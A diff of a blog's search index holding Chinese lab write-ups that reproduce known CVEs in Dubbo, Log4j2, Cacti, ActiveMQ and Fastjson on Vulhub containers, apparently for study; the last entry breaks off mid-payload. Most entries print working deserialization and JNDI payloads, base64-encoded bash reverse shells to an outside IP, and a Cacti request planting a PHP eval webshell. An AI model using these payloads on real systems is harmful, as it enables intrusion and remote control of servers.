@@ -554,8 +554,9 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</title>
     <url>/2023/09/05/Aapche%20Dubbo%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）"><a href="#Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）"></a>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</h1><p>Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。RPC，全称为Remote Procedure Call，即远程过程调用，它是一个计算机通信协议。它允许像调用本地服务一样调用远程服务。</p>
+    <content><![CDATA[<p>Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。RPC，全称为Remote Procedure Call，即远程过程调用，它是一个计算机通信协议。它允许像调用本地服务一样调用远程服务。</p>
 <p>Dubbo可以使用不同协议通信，当使用http协议时，Apache Dubbo直接使用了Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞。</p>
+<a id="more"></a>
 <h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Dubbo 2.7.4及以前版本</span><br></pre></td></tr></table></figure>
 <p>Apache Dubbo 2.7.5后Dubbo使用<code>com.googlecode.jsonrpc4j.JsonRpcServer</code>替换了<code>HttpInvokerServiceExporter</code>。</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个Apache Dubbo 2.7.3 Provider：</p>
@@ -568,19 +569,19 @@ for i in range(0,30):#密码猜测
 <p>记得把2181加入安全组，所有ip都能访问</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wget https://dlcdn.apache.org/zookeeper/zookeeper-3.7.1/apache-zookeeper-3.7.1-bin.tar.gz --no-check-certificate</span><br><span class="line">或者</span><br><span class="line">wget https://archive.apache.org/dist/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">$ tar xvf apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">$ cd apache-zookeeper-3.7.0-bin/bin</span><br><span class="line">$ ./zkCli.sh -server target-ip:2181</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905150644982.png" alt="image-20230905150644982"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905150745040.png" alt="image-20230905150745040"></p>
+<p><img src="/images/image-20230905150644982.png" alt="image-20230905150644982"></p>
+<p><img src="/images/image-20230905150745040.png" alt="image-20230905150745040"></p>
 <p>连接后进入一个交互式控制台，使用<code>ls</code>即可列出其中所有节点，包括Dubbo相关的配置：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905153725509.png" alt="image-20230905153725509"></p>
+<p><img src="/images/image-20230905153725509.png" alt="image-20230905153725509"></p>
 <p>获取到RPC接口名为<code>org.vulhub.api.CalcService</code>。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到<code>http://your-ip:8080/org.vulhub.api.CalcService</code>即可触发反序列化漏洞：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -jar ysoserial-master-2874a69f61-1.jar CommonsCollections6 &quot;touch /tmp/awesome_poc&quot; &gt; 1.poc</span><br><span class="line"></span><br><span class="line">$ curl -XPOST --data-binary @1.poc http://123.56.181.14:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905154734165.png" alt="image-20230905154734165"></p>
+<p><img src="/images/image-20230905154734165.png" alt="image-20230905154734165"></p>
 <p>进入docker，命令<code>touch /tmp/awesome_poc</code>执行成功：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905154826790.png" alt="image-20230905154826790"></p>
+<p><img src="/images/image-20230905154826790.png" alt="image-20230905154826790"></p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br><span class="line"># base64编码</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -jar ysoserial-master-2874a69f61-1.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; shell.poc</span><br><span class="line">$ curl -XPOST --data-binary @shell.poc http://123.56.181.14:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905160303151.png" alt="image-20230905160303151"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905155920271.png" alt="image-20230905155920271"></p>
+<p><img src="/images/image-20230905160303151.png" alt="image-20230905160303151"></p>
+<p><img src="/images/image-20230905155920271.png" alt="image-20230905155920271"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -592,7 +593,8 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228</title>
     <url>/2023/09/10/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2021-44228/</url>
-    <content><![CDATA[<h1 id="Apache-Log4j2-lookup-JNDI-注入漏洞-CVE-2021-44228"><a href="#Apache-Log4j2-lookup-JNDI-注入漏洞-CVE-2021-44228" class="headerlink" title="Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228"></a>Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>${jndi:ldap://evil.com/example}</code>的lookup用于进行JNDI注入，执行任意代码。</p>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>${jndi:ldap://evil.com/example}</code>的lookup用于进行JNDI注入，执行任意代码。</p>
+<a id="more"></a>
 <blockquote>
 <p><strong>Apache Log4j2</strong> 是一个 Java 的日志管理工具，是 Log4j 的升级版本</p>
 </blockquote>
@@ -626,9 +628,9 @@ for i in range(0,30):#密码猜测
 </ul>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><code>${jndi:ldap://${sys:java.version}.example.com}</code>是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值，发送如下数据包：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.example.com&#125; HTTP/1.1</span><br><span class="line">Host: your-ip:8983</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910210522752.png" alt="image-20230910210522752"></p>
+<p><img src="/images/image-20230910210522752.png" alt="image-20230910210522752"></p>
 <p>我们可以在DNS日志平台收到相关日志，显示出当前Java版本：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910210642364.png" alt="image-20230910210642364"></p>
+<p><img src="/images/image-20230910210642364.png" alt="image-20230910210642364"></p>
 <p>实际利用JNDI注入漏洞，可以使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">这个工具</a>。</p>
 <p>若利用工具，要确保 <strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口可用，不被其他程序占用。</p>
 <p>需要把生成的 JNDI链接注入到存在漏洞的应用环境中</p>
@@ -639,21 +641,21 @@ for i in range(0,30):#密码猜测
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git</span><br><span class="line">$ cd JNDI-Injection-Exploit</span><br><span class="line">$ mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214122074.png" alt="image-20230910214122074"></p>
+<p><img src="/images/image-20230910214122074.png" alt="image-20230910214122074"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar /root/vulhub-tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span><br><span class="line">-C &quot;touch /tmp/awesoe_oc&quot; -A &quot;123.56.181.14&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910215040184.png" alt="image-20230910215040184"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214233218.png" alt="image-20230910214233218"></p>
+<p><img src="/images/image-20230910215040184.png" alt="image-20230910215040184"></p>
+<p><img src="/images/image-20230910214233218.png" alt="image-20230910214233218"></p>
 <p>利用完毕后，可见<code>touch /tmp/awesome_oc</code>已经成功被执行：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910213939887.png" alt="image-20230910213939887"></p>
+<p><img src="/images/image-20230910213939887.png" alt="image-20230910213939887"></p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>若出现端口已被占用问题，可逐一检查<strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口，杀死相关占用进程</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214508372.png" alt="image-20230910214508372"></p>
+<p><img src="/images/image-20230910214508372.png" alt="image-20230910214508372"></p>
 <p>  构造反弹shell命令：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar /root/vulhub-tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;123.56.181.14&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214650226.png" alt="image-20230910214650226"></p>
-<p>  <img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214740245.png" alt="image-20230910214740245"></p>
+<p><img src="/images/image-20230910214650226.png" alt="image-20230910214650226"></p>
+<p>  <img src="/images/image-20230910214740245.png" alt="image-20230910214740245"></p>
 <p>攻击机监听4444端口，上述请求包发送后，接收反弹shell：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214913343.png" alt="image-20230910214913343"></p>
+<p><img src="/images/image-20230910214913343.png" alt="image-20230910214913343"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -665,7 +667,8 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Cacti 前台命令注入漏洞（CVE-2022-46169）</title>
     <url>/2023/07/19/Cacti%20%E5%89%8D%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-46169%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="Cacti-前台命令注入漏洞（CVE-2022-46169）"><a href="#Cacti-前台命令注入漏洞（CVE-2022-46169）" class="headerlink" title="Cacti 前台命令注入漏洞（CVE-2022-46169）"></a>Cacti 前台命令注入漏洞（CVE-2022-46169）</h1><p>Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p>
+    <content><![CDATA[<p>Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p>
+<a id="more"></a>
 <blockquote>
 <p>Cacti是一款用于网络监控和图形化展示的开源软件。它基于PHP和MySQL构建，提供了丰富的功能和易于使用的界面，可以帮助管理员监控网络设备、服务器、应用程序等的性能指标并进行可视化展示。</p>
 <p>以下是Cacti的主要特点：</p>
@@ -681,26 +684,26 @@ for i in range(0,30):#密码猜测
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
 <p>环境启动后，访问<code>http://your-ip:8080</code>会跳转到登录页面。使用admin/admin作为账号密码登录，并根据页面中的提示进行初始化。</p>
 <p>实际上初始化的过程就是不断点击“下一步”，直到安装成功：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904163830731.png" alt="image-20230904163830731"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904164032019.png" alt="image-20230904164032019"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904165024135.png" alt="image-20230904165024135"></p>
+<p><img src="/images/image-20230904163830731.png" alt="image-20230904163830731"></p>
+<p><img src="/images/image-20230904164032019.png" alt="image-20230904164032019"></p>
+<p><img src="/images/image-20230904165024135.png" alt="image-20230904165024135"></p>
 <p>这个漏洞的利用需要Cacti应用中至少存在一个类似是<code>POLLER_ACTION_SCRIPT_PHP</code>的采集器。所以，我们在Cacti后台首页创建一个新的Graph：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904165343918.png" alt="image-20230904165343918"></p>
+<p><img src="/images/image-20230904165343918.png" alt="image-20230904165343918"></p>
 <p>选择的Graph Type是“Device - Uptime”，点击创建：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904165506334.png" alt="image-20230904165506334"></p>
+<p><img src="/images/image-20230904165506334.png" alt="image-20230904165506334"></p>
 <p>完成上述初始化后，我们切换到攻击者的角色。作为攻击者，发送如下数据包：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`touch+/tmp/success` HTTP/1.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Host: 123.56.181.14:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://123.56.181.14:8080/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904190746183.png" alt="image-20230904190746183"></p>
+<p><img src="/images/image-20230904190746183.png" alt="image-20230904190746183"></p>
 <p>虽然响应包里没有回显，但是进入容器中即可发现<code>/tmp/success</code>已成功被创建：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904191128715.png" alt="image-20230904191128715"></p>
+<p><img src="/images/image-20230904191128715.png" alt="image-20230904191128715"></p>
 <h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`echo+&apos;&lt;?php+phpinfo();?&gt;&apos;&gt;/var/www/html/test.php` HTTP/1.1</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904191902625.png" alt="image-20230904191902625"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904192010205.png" alt="image-20230904192010205"></p>
+<p><img src="/images/image-20230904191902625.png" alt="image-20230904191902625"></p>
+<p><img src="/images/image-20230904192010205.png" alt="image-20230904192010205"></p>
 <h3 id="写入蚁剑webshell"><a href="#写入蚁剑webshell" class="headerlink" title="写入蚁剑webshell"></a>写入蚁剑webshell</h3><p>一句话木马</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&lt;?php @eval($_POST[&apos;attack&apos;]);?&gt; </span><br><span class="line">GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`echo+&apos;&lt;?php+@eval($_POST[&apos;attack&apos;]);?&gt;&apos;&gt;/var/www/html/test.php` HTTP/1.1</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904192517120.png" alt="image-20230904192517120"></p>
+<p><img src="/images/image-20230904192517120.png" alt="image-20230904192517120"></p>
 <p>蚁剑连接</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904192543523.png" alt="image-20230904192543523"></p>
+<p><img src="/images/image-20230904192543523.png" alt="image-20230904192543523"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -712,7 +715,8 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>ActiveMQ 反序列化漏洞（CVE-2015-5254）</title>
     <url>/2022/09/05/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h1><p>Apache ActiveMQ 是一个流行的、开源的、跨语言的消息队列 (MQ) 项目，它是 Apache 基金会下的顶级项目之一。ActiveMQ 支持多种协议和编程语言，包括 Java、C++、Python、PHP、Ruby、Perl、.NET 等。它提供了一种可靠的异步通信方式，用于在分布式系统中传递消息。由于其卓越的性能、可靠性和易用性，ActiveMQ 成为了很多企业和组织在构建大型分布式应用和微服务架构时的首选消息队列软件之一。</p>
+    <content><![CDATA[<p>Apache ActiveMQ 是一个流行的、开源的、跨语言的消息队列 (MQ) 项目，它是 Apache 基金会下的顶级项目之一。ActiveMQ 支持多种协议和编程语言，包括 Java、C++、Python、PHP、Ruby、Perl、.NET 等。它提供了一种可靠的异步通信方式，用于在分布式系统中传递消息。由于其卓越的性能、可靠性和易用性，ActiveMQ 成为了很多企业和组织在构建大型分布式应用和微服务架构时的首选消息队列软件之一。</p>
+<a id="more"></a>
 <p>ActiveMQ 的主要特点包括：</p>
 <ol>
 <li>支持多种消息协议和编程语言：ActiveMQ 可以通过不同的协议和编程语言进行访问，如 JMS、AMQP、STOMP、REST、WebSocket 等。</li>
@@ -735,22 +739,22 @@ for i in range(0,30):#密码猜测
 <p>复现需要有java环境，jdk1.8</p>
 <p>执行代码</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/activemq/CVE-2015-5254/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904124028892.png" alt="image-20230904124028892"></p>
+<p><img src="/images/image-20230904124028892.png" alt="image-20230904124028892"></p>
 <p>环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p>
 <p>管理员的登录页面，账号密码都是：admin</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904124647232.png" alt="image-20230904124647232"></p>
+<p><img src="/images/image-20230904124647232.png" alt="image-20230904124647232"></p>
 <p>使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
 <p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
 <p>执行：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-tools/activemq/</span><br><span class="line">mkdir external</span><br><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904125240830.png" alt="image-20230904125240830"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904130137568.png" alt="image-20230904130137568"></p>
+<p><img src="/images/image-20230904125240830.png" alt="image-20230904125240830"></p>
+<p><img src="/images/image-20230904130137568.png" alt="image-20230904130137568"></p>
 <p>此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904130521742.png" alt="image-20230904130521742"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904130932593.png" alt="image-20230904130932593"></p>
+<p><img src="/images/image-20230904130521742.png" alt="image-20230904130521742"></p>
+<p><img src="/images/image-20230904130932593.png" alt="image-20230904130932593"></p>
 <p>bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 123.56.181.14 61616</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904140556378.png" alt="image-20230904140556378"></p>
+<p><img src="/images/image-20230904140556378.png" alt="image-20230904140556378"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -762,7 +766,8 @@ for i in range(0,30):#密码猜测
   <entry>
     <title>Fastjson 1.2.24 反序列化导致任意命令执行漏洞</title>
     <url>/2023/09/05/Fastjson%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="Fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#Fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="Fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>Fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><p>Fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
+    <content><![CDATA[<p>Fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
+<a id="more"></a>
 <blockquote>
 <p>Fastjson 是一个功能强大、高性能的 JSON 处理库，适用于各种 Java 应用程序，并提供了简便的 API 来处理 JSON 数据。无论是简单的序列化和反序列化，还是复杂的数据转换和处理，Fastjson 都是一个值得考虑的选择</p>
 </blockquote>
@@ -776,41 +781,41 @@ for i in range(0,30):#密码猜测
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub运行测试环境：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/fastjson/1.2.24-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 <p>环境运行后，访问<code>http://your-ip:8090</code>即可看到JSON格式的输出。</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905192058005.png" alt="image-20230905192058005" style="zoom:50%;"></p>
+<p><img src="/images/image-20230905192058005.png" alt="image-20230905192058005" style="zoom:50%;"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p>
 <p>首先编译并上传命令执行代码，如<code>http://evil.com/TouchFile.class</code>：</p>
 <p>1.执行<code>javac TouchFile.java</code>，生成<code>TouchFile.class</code>。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">#TouchFile.java内容如下</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905193227159.png" alt="image-20230905193227159"></p>
+<p><img src="/images/image-20230905193227159.png" alt="image-20230905193227159"></p>
 <p>2.通过python搭建一个临时的web服务，该服务是为了接收LDAP服务重定向请求，需要在payload的目录下开启此web服务，这样才可以访问到payload文件。此处payload文件即<code>TouchFile.class</code>。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m http.server 8888</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905193816969.png" alt="image-20230905193816969" style="zoom:67%;"></p>
+<p><img src="/images/image-20230905193816969.png" alt="image-20230905193816969" style="zoom:67%;"></p>
 <p>3.借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://123.56.181.14:8888/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
 <p>再开一个窗口，连接vps，执行命令</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905194335821.png" alt="image-20230905194335821"></p>
+<p><img src="/images/image-20230905194335821.png" alt="image-20230905194335821"></p>
 <p>4.向靶场服务器发送Payload，带上RMI的地址，注意Content-Type应该是<code>application/json</code>：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 123.56.181.14:8090</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        